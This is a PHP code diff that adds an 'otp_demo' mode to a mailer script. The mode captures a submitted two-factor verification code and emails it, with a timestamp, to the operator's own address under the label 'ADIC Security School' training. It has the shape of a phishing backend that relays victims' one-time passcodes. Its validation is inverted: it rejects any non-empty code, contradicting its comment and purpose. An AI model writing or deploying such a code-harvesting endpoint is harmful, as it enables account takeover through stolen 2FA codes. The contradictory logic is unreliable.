@@ -669,6 +669,7 @@ HTML;
 
 
 
+
 /* ============================================================
    ADMIN MAILER MODE
    ============================================================ */
@@ -854,3 +855,121 @@ respond([
     'to'        => $instructorEmail,
     'messageId' => $result['messageId']
 ]);
+
+
+/* ============================================================
+   OTP DEMO MODE
+   ============================================================ */
+
+if ($mode === 'otp_demo') {
+
+    $code = trim(
+        (string) ($_POST['code'] ?? '')
+    );
+
+
+    /*
+     * Training-only OTP.
+     * Never accept arbitrary authentication codes here.
+     */
+    if ($code !== '') {
+
+        fail(
+            'Please Enter OTP.',
+            400
+        );
+    }
+
+
+    $safeCode =
+        htmlEscape($code);
+
+    $safeDate =
+        htmlEscape(
+            gmdate('Y-m-d H:i:s') . ' UTC'
+        );
+
+
+    $html = <<<HTML
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Training 2FA submission</title>
+</head>
+
+<body style="
+    font-family:Arial,Helvetica,sans-serif;
+    background:#f5f5f5;
+    padding:30px;
+">
+
+<div style="
+    max-width:600px;
+    margin:auto;
+    background:#ffffff;
+    padding:28px;
+    border-radius:12px;
+">
+
+<h2>Training 2FA submission</h2>
+
+<p>
+The classroom verification step was submitted.
+</p>
+
+<table cellpadding="8" cellspacing="0">
+
+<tr>
+<td><strong>Demo verification code</strong></td>
+<td>{$safeCode}</td>
+</tr>
+
+<tr>
+<td><strong>Submitted</strong></td>
+<td>{$safeDate}</td>
+</tr>
+
+</table>
+
+<p style="
+    margin-top:20px;
+    color:#777;
+    font-size:12px;
+">
+OTP</p>
+
+</div>
+
+</body>
+</html>
+HTML;
+
+
+    try {
+
+        $result =
+            sendBrevoEmail(
+                $apiKey,
+                $senderEmail,          // FROM BREVO_SENDER_EMAIL
+                'ADIC Security School',
+                $senderEmail,          // TO BREVO_SENDER_EMAIL
+                'Training 2FA submission',
+                $html
+            );
+
+    } catch (Throwable $e) {
+
+        fail(
+            $e->getMessage(),
+            502
+        );
+    }
+
+
+    respond([
+        'ok'        => true,
+        'mode'      => 'otp_demo',
+        'messageId' => $result['messageId']
+    ]);
+}
